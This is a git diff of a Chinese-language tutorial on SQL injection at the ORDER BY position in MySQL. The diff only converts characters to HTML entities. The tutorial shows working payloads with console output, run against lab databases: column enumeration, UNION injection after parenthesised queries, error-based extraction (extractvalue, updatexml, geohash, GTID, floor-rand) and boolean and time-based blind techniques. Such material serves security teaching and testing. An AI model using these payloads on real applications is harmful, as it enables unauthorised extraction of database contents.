@@ -43,7 +43,7 @@ ORDER BY语句在查询结果中对记录进行排序，提供了灵活的排序
 select * from table order by id desc
 ```
 
-如果只能控制desc这个位置的参数，我们需要利用SQL语法的特性，通过拼接 `desc,<column>`的形式控制列名作为注入点，即：
+如果只能控制desc这个位置的参数，我们需要利用SQL语法的特性，通过拼接 `desc,&lt;column&gt;`的形式控制列名作为注入点，即：
 
 ```
 select * from table order by id desc, column_name
@@ -57,10 +57,10 @@ select * from table order by id desc, column_name
 
 ```sql
 # sqli-labs 数据库，版本5.7.26
-mysql> select * from users;
-+----+----------+------------+
+mysql&gt; select * from users;
+&#43;----&#43;----------&#43;------------&#43;
 | id | username | password   |
-+----+----------+------------+
+&#43;----&#43;----------&#43;------------&#43;
 |  1 | Dumb     | Dumb       |
 |  2 | Angelina | I-kill-you |
 |  3 | Dummy    | p@ssword   |
@@ -75,19 +75,19 @@ mysql> select * from users;
 | 12 | dhakkan  | dumbo      |
 | 14 | admin4   | admin4     |
 | 13 | admin1   | admin3     |
-+----+----------+------------+
+&#43;----&#43;----------&#43;------------&#43;
 14 rows in set (0.01 sec)
 
 # 自建数据库，版本8.0.31
-mysql> select * from users;
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users;
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (0.01 sec)
 ```
 
@@ -96,18 +96,18 @@ mysql> select * from users;
 Order by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生类似如下报错：
 
 ```sql
-mysql> select * from users order by 5;
-+----+-------+----------+------+-----------+
+mysql&gt; select * from users order by 5;
+&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
 | id | name  | pass     | age  | area      |
-+----+-------+----------+------+-----------+
+&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1 | 123456   |   18 | beijing   |
 |  3 | user1 | qwer1234 |   28 | guangzhou |
 |  2 | test2 | 543210   |   20 | shanghai  |
-+----+-------+----------+------+-----------+
+&#43;----&#43;-------&#43;----------&#43;------&#43;-----------&#43;
 3 rows in set (0.00 sec)
 
-mysql> select * from users order by 6;
-ERROR 1054 (42S22): Unknown column '6' in 'order clause'
+mysql&gt; select * from users order by 6;
+ERROR 1054 (42S22): Unknown column &#39;6&#39; in &#39;order clause&#39;
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165050006.png)
@@ -117,34 +117,34 @@ ERROR 1054 (42S22): Unknown column '6' in 'order clause'
 order by位置后无法接union select，语法不支持，报错如下。
 
 ```sql
-mysql> select * from users order by id union select 1,2,3,4,5;
-ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1,2,3,4,5' at line 1
+mysql&gt; select * from users order by id union select 1,2,3,4,5;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;union select 1,2,3,4,5&#39; at line 1
 ```
 
 但是有一种情况，可能可以用，即前一句SQL语句整体处在括号中。如下：
 
 ```sql
-mysql> (select * from users order by id);
-+----+--------+----------+------+-----------+
+mysql&gt; (select * from users order by id);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (0.01 sec)
 
-mysql> (select * from users order by id) union select 1,2,3,4,5;
-+----+--------+----------+------+-----------+
+mysql&gt; (select * from users order by id) union select 1,2,3,4,5;
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
 |  1 | 2      | 3        |    4 | 5         |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 5 rows in set (0.01 sec)
 ```
 
@@ -153,16 +153,16 @@ mysql> (select * from users order by id) union select 1,2,3,4,5;
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165136764.png)
 
 ```sql
-mysql> (select * from users order by id) union select 1,user(),3,4,version();
-+----+----------------+----------+------+-----------+
+mysql&gt; (select * from users order by id) union select 1,user(),3,4,version();
+&#43;----&#43;----------------&#43;----------&#43;------&#43;-----------&#43;
 | id | name           | pass     | age  | area      |
-+----+----------------+----------+------+-----------+
+&#43;----&#43;----------------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1          | 123456   |   18 | beijing   |
 |  2 | test2          | 543210   |   20 | shanghai  |
 |  3 | user1          | qwer1234 |   28 | guangzhou |
 |  4 | aduser         | 123456   |   10 | beijing   |
 |  1 | root@127.0.0.1 | 3        |    4 | 8.0.31    |
-+----+----------------+----------+------+-----------+
+&#43;----&#43;----------------&#43;----------&#43;------&#43;-----------&#43;
 5 rows in set (0.01 sec)
 ```
 
@@ -175,26 +175,26 @@ mysql> (select * from users order by id) union select 1,user(),3,4,version();
 #### 1）XPath报错
 
 ```sql
-mysql> select * from users order by id/extractvalue(1,concat('~',(select version())));
-ERROR 1105 (HY000): XPATH syntax error: '~8.0.31'
+mysql&gt; select * from users order by id/extractvalue(1,concat(&#39;~&#39;,(select version())));
+ERROR 1105 (HY000): XPATH syntax error: &#39;~8.0.31&#39;
 
-mysql> select * from users order by id/updatexml(1,concat(0x7e,(select version()),0x7e),1);
-ERROR 1105 (HY000): XPATH syntax error: '~8.0.31~'
+mysql&gt; select * from users order by id/updatexml(1,concat(0x7e,(select version()),0x7e),1);
+ERROR 1105 (HY000): XPATH syntax error: &#39;~8.0.31~&#39;
 ```
 
 #### 2）Geohash报错
 
 ```sql
 # mysql 5.7.26
-mysql>  select * from users order by users.id/(ST_LongFromGeoHash((select version())));
-ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LONGFROMGEOHASH
-mysql>
-mysql> select * from users order by users.id/(ST_PointFromGeoHash((select version()),1));
+mysql&gt;  select * from users order by users.id/(ST_LongFromGeoHash((select version())));
+ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LONGFROMGEOHASH
+mysql&gt;
+mysql&gt; select * from users order by users.id/(ST_PointFromGeoHash((select version()),1));
 ERROR 1210 (HY000): Incorrect arguments to /
-mysql>
-mysql> select * from users order by users.id/(ST_LatFromGeoHash((select version())));
-ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LATFROMGEOHASH
-mysql>
+mysql&gt;
+mysql&gt; select * from users order by users.id/(ST_LatFromGeoHash((select version())));
+ERROR 1411 (HY000): Incorrect geohash value: &#39;5.7.26&#39; for function ST_LATFROMGEOHASH
+mysql&gt;
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165245962.png)
@@ -203,14 +203,14 @@ mysql>
 
 ```sql
 # mysql 8.0.31 
-mysql> select * from users order by id/(ST_LongFromGeoHash((select version())));
-ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LONGFROMGEOHASH
-mysql> 
-mysql> select * from users order by id/(ST_PointFromGeoHash((select version()),1));
+mysql&gt; select * from users order by id/(ST_LongFromGeoHash((select version())));
+ERROR 1411 (HY000): Incorrect geohash value: &#39;8.0.31&#39; for function ST_LONGFROMGEOHASH
+mysql&gt; 
+mysql&gt; select * from users order by id/(ST_PointFromGeoHash((select version()),1));
 ERROR 1210 (HY000): Incorrect arguments to /
-mysql> 
-mysql> select * from users order by id/(ST_LatFromGeoHash((select version())));
-ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LATFROMGEOHASH
+mysql&gt; 
+mysql&gt; select * from users order by id/(ST_LatFromGeoHash((select version())));
+ERROR 1411 (HY000): Incorrect geohash value: &#39;8.0.31&#39; for function ST_LATFROMGEOHASH
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165259586.png)
@@ -219,23 +219,23 @@ ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LATFROMGEO
 
 ```sql
 # mysql 5.7.26
-mysql> select * from users where username like 'admin%' order by users.id/(gtid_subtract(version(),1));
-ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'.
-mysql>
-mysql> select * from users where username like 'admin%' order by users.id/(gtid_subset(version(),1));
-ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'.
-mysql>
+mysql&gt; select * from users where username like &#39;admin%&#39; order by users.id/(gtid_subtract(version(),1));
+ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
+mysql&gt;
+mysql&gt; select * from users where username like &#39;admin%&#39; order by users.id/(gtid_subset(version(),1));
+ERROR 1772 (HY000): Malformed GTID set specification &#39;5.7.26&#39;.
+mysql&gt;
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165418105.png)
 
 ```sql
 # mysql 8.0.31
-mysql> select * from users order by users.id/(gtid_subtract(version(),1));
-ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'.
-mysql> 
-mysql> select * from users order by users.id/(gtid_subset(version(),1));
-ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'.
+mysql&gt; select * from users order by users.id/(gtid_subtract(version(),1));
+ERROR 1772 (HY000): Malformed GTID set specification &#39;8.0.31&#39;.
+mysql&gt; 
+mysql&gt; select * from users order by users.id/(gtid_subset(version(),1));
+ERROR 1772 (HY000): Malformed GTID set specification &#39;8.0.31&#39;.
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165459330.png)
@@ -244,17 +244,17 @@ ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'.
 
 ```sql
 # mysql 5.8.26
-mysql> select * from users where username like 'admin%' order by (select 1 from (select count(*),concat(version(),'~',floor(rand(0)*2))x from information_schema.tables group by x)a);
-ERROR 1062 (23000): Duplicate entry '5.7.26~1' for key '<group_key>'
+mysql&gt; select * from users where username like &#39;admin%&#39; order by (select 1 from (select count(*),concat(version(),&#39;~&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a);
+ERROR 1062 (23000): Duplicate entry &#39;5.7.26~1&#39; for key &#39;&lt;group_key&gt;&#39;
 
-mysql> select * from users where username like 'admin%' order by (select count(*) from information_schema.tables group by concat((select version()),0x7e,floor(rand(0)*2)));
-ERROR 1062 (23000): Duplicate entry '5.7.26~1' for key '<group_key>'
+mysql&gt; select * from users where username like &#39;admin%&#39; order by (select count(*) from information_schema.tables group by concat((select version()),0x7e,floor(rand(0)*2)));
+ERROR 1062 (23000): Duplicate entry &#39;5.7.26~1&#39; for key &#39;&lt;group_key&gt;&#39;
 ```
 
 mysql 8.0.31不适用
 
 ```
-mysql> select * from users order by (select 1 from (select count(*),concat(version(),'~',floor(rand(0)*2))x from information_schema.tables group by x)a);
+mysql&gt; select * from users order by (select 1 from (select count(*),concat(version(),&#39;~&#39;,floor(rand(0)*2))x from information_schema.tables group by x)a);
 ERROR 1242 (21000): Subquery returns more than 1 row
 ```
 
@@ -266,26 +266,26 @@ ERROR 1242 (21000): Subquery returns more than 1 row
 
 ```sql
 # 前面等式成立则按id列进行排序，不成立则按age列进行排序。
-mysql> select * from users order by if(1=0,id,age);
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users order by if(1=0,id,age);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  4 | aduser | 123456   |   10 | beijing   |
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (0.01 sec)
 
-mysql> select * from users order by if(1=1,id,age);
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users order by if(1=1,id,age);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (0.00 sec)
 ```
 
@@ -294,26 +294,26 @@ mysql> select * from users order by if(1=1,id,age);
 可以看到这种方法，必须要知道列名，利用还是有条件的。
 
 ```sql
-mysql> select * from users order by if((substr(version(),1,1)='8'),id,age);
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users order by if((substr(version(),1,1)=&#39;8&#39;),id,age);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (0.01 sec)
 
-mysql> select * from users order by if((substr(version(),1,1)='6'),id,age);
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users order by if((substr(version(),1,1)=&#39;6&#39;),id,age);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  4 | aduser | 123456   |   10 | beijing   |
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (0.01 sec)
 ```
 
@@ -332,7 +332,7 @@ mysql> select * from users order by if((substr(version(),1,1)='6'),id,age);
 ```sql
 order by rand(1)
 order by rand(0)
-order by rand(substr(version(),1,1)='8')
+order by rand(substr(version(),1,1)=&#39;8&#39;)
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165723761.png)
@@ -349,7 +349,7 @@ order by id^1;
 
 
 ```sql
-select * from users order by id^(substr(version(),1,1)='8');select * from users order by id^(substr(version(),1,1)='6');
+select * from users order by id^(substr(version(),1,1)=&#39;8&#39;);select * from users order by id^(substr(version(),1,1)=&#39;6&#39;);
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165803446.png)
@@ -357,7 +357,7 @@ select * from users order by id^(substr(version(),1,1)='8');select * from users 
 
 
 ```
-order by id^(select (select version()) regexp '^5');order by id^(select (select version()) regexp 0x5e35);  # 0x5e35 <-> hex('^5') # 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异
+order by id^(select (select version()) regexp &#39;^5&#39;);order by id^(select (select version()) regexp 0x5e35);  # 0x5e35 &lt;-&gt; hex(&#39;^5&#39;) # 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异
 ```
 
 ![图片](/resource/SQL注入之OrderBy位置点注入.assets/640-20230814165815046.png)
@@ -367,26 +367,26 @@ order by id^(select (select version()) regexp '^5');order by id^(select (select 
 order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。
 
 ```mysql
-mysql> select * from users order by sleep(1);
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users order by sleep(1);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (4.02 sec)
 
-mysql> select * from users order by id,if((substr(version(),1,1)=8),sleep(1),0);
-+----+--------+----------+------+-----------+
+mysql&gt; select * from users order by id,if((substr(version(),1,1)=8),sleep(1),0);
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 | id | name   | pass     | age  | area      |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 |  1 | test1  | 123456   |   18 | beijing   |
 |  2 | test2  | 543210   |   20 | shanghai  |
 |  3 | user1  | qwer1234 |   28 | guangzhou |
 |  4 | aduser | 123456   |   10 | beijing   |
-+----+--------+----------+------+-----------+
+&#43;----&#43;--------&#43;----------&#43;------&#43;-----------&#43;
 4 rows in set (4.01 sec)
 ```
 
